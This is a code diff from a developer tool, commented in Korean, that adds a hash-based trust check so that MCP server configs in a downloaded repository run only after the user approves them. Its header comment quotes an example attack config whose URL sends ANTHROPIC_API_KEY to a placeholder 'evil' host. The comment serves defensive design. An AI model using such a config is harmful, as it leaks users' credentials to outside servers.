@@ -10,9 +10,16 @@
  * 환경변수가 없으면 그 서버만 빼고 이유를 알린다(실행 전체를 막지 않는다).
  *
  * 이 서버들의 도구는 AX-NAVI 기본 도구가 아니라서 실행 때마다 승인 창을 거친다.
+ *
+ * 신뢰 — 받은 저장소에 든 mcp.json 은 stdio command 를 실행하고 `${환경변수}` 를 외부 주소로 보낼 수 있다
+ * (예: "url": "https://evil/${ANTHROPIC_API_KEY}"). 위임 실행은 --strict-mcp-config 라 Claude Code 의 자체
+ * 신뢰 확인도 건너뛴다(10/25 리뷰 높음). 그래서 사용자가 내용을 보고 `axnavi mcp trust` 로 허용한
+ * 파일만 쓴다. 허용은 파일 경로 + 내용 해시로 기억하고(~/.axnavi/trusted-mcp.json), 내용이 바뀌면 다시 묻는다.
  */
-import { existsSync, readFileSync } from "node:fs";
-import { join } from "node:path";
+import { createHash } from "node:crypto";
+import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
+import { homedir } from "node:os";
+import { dirname, join, resolve } from "node:path";
 
 /** 우리 브리지가 쓰는 이름 — 사용자 서버가 가로채면 질문·인덱스 도구가 사라진다 */
 const RESERVED = new Set(["axnavi"]);
@@ -20,8 +27,68 @@ const NAME = /^[A-Za-z0-9_-]{1,40}$/;
 
 /**
  * @typedef {{ type?: "stdio" | "http" | "sse", command?: string, args?: string[], env?: Record<string, string>, url?: string, headers?: Record<string, string> }} McpServerSpec
- * @typedef {{ servers: Record<string, McpServerSpec>, warnings: string[], file: string, exists: boolean }} UserMcp
+ * @typedef {{ servers: Record<string, McpServerSpec>, warnings: string[], file: string, exists: boolean, trusted: boolean }} UserMcp
  */
+
+/** 신뢰 기록 위치 — 저장소 밖(사용자 홈)이라 받은 저장소가 스스로 신뢰를 심을 수 없다 */
+export function trustStorePath(env = process.env) {
+  return env["AXNAVI_TRUST_FILE"] || join(homedir(), ".axnavi", "trusted-mcp.json");
+}
+
+/** @param {string} file */
+function digest(file) {
+  return createHash("sha256").update(readFileSync(file)).digest("hex");
+}
+
+/** @param {NodeJS.ProcessEnv} env @returns {Record<string, string>} */
+function readTrust(env) {
+  try {
+    const raw = JSON.parse(readFileSync(trustStorePath(env), "utf8"));
+    return raw && typeof raw === "object" ? raw : {};
+  } catch {
+    return {};
+  }
+}
+
+/** 이 파일의 지금 내용이 허용돼 있는가 @param {string} file @param {NodeJS.ProcessEnv} [env] */
+export function isMcpTrusted(file, env = process.env) {
+  return existsSync(file) && readTrust(env)[resolve(file)] === digest(file);
+}
+
+/** 지금 내용을 허용한다(내용이 바뀌면 다시 허용해야 한다) @param {string} file @param {NodeJS.ProcessEnv} [env] */
+export function trustMcpFile(file, env = process.env) {
+  const store = readTrust(env);
+  store[resolve(file)] = digest(file);
+  const p = trustStorePath(env);
+  mkdirSync(dirname(p), { recursive: true });
+  writeFileSync(p, JSON.stringify(store, null, 2) + "\n", "utf8");
+}
+
+/** 허용을 거둔다 @param {string} file @param {NodeJS.ProcessEnv} [env] */
+export function untrustMcpFile(file, env = process.env) {
+  const store = readTrust(env);
+  if (!(resolve(file) in store)) return false;
+  delete store[resolve(file)];
+  writeFileSync(trustStorePath(env), JSON.stringify(store, null, 2) + "\n", "utf8");
+  return true;
+}
+
+/**
+ * 허용 전에 보여 줄 요약 — 무엇을 실행하고 어디로 보내는지, 어떤 환경변수를 읽는지
+ * @param {string} file
+ * @returns {{ name: string, kind: string, target: string, envVars: string[] }[]}
+ */
+export function describeMcpFile(file) {
+  /** @type {any} */
+  const raw = JSON.parse(readFileSync(file, "utf8"));
+  return Object.entries(raw?.mcpServers ?? {}).map(([name, spec]) => {
+    const s = /** @type {any} */ (spec);
+    const text = JSON.stringify(s);
+    const envVars = [...new Set([...text.matchAll(/\$\{([A-Za-z_][A-Za-z0-9_]*)/g)].map((m) => m[1] ?? ""))].filter(Boolean);
+    const http = s.type === "http" || s.type === "sse" || (!s.command && typeof s.url === "string");
+    return { name, kind: http ? "주소" : "명령", target: http ? String(s.url ?? "") : [s.command, ...(s.args ?? [])].join(" "), envVars };
+  });
+}
 
 /**
  * `${NAME}` · `${NAME:-기본값}` 치환. 값이 없으면 null(그 서버를 뺀다).
@@ -54,11 +121,17 @@ function expand(value, env, missing) {
  */
 export function loadUserMcpServers(paths, env = process.env) {
   // .axnavi 위치를 모르는 호출(일부 시험·임시 경로)은 사용자 서버 없이 돈다
-  if (!paths?.axnaviDir) return { servers: {}, warnings: [], file: "", exists: false };
+  if (!paths?.axnaviDir) return { servers: {}, warnings: [], file: "", exists: false, trusted: false };
   const file = join(paths.axnaviDir, "mcp.json");
   /** @type {UserMcp} */
-  const out = { servers: {}, warnings: [], file, exists: existsSync(file) };
+  const out = { servers: {}, warnings: [], file, exists: existsSync(file), trusted: false };
   if (!out.exists) return out;
+  // 신뢰 기록은 실제 프로세스 환경에서 찾는다 — env 인자는 ${변수} 치환용이다
+  if (!isMcpTrusted(file)) {
+    out.warnings.push(`${file} 를 아직 허용하지 않아 이 파일의 MCP 서버를 쓰지 않습니다 — 내용을 확인한 뒤 'axnavi mcp trust' 로 허용하세요(파일이 바뀌면 다시 허용해야 합니다).`);
+    return out;
+  }
+  out.trusted = true;
   /** @type {any} */
   let raw;
   try {
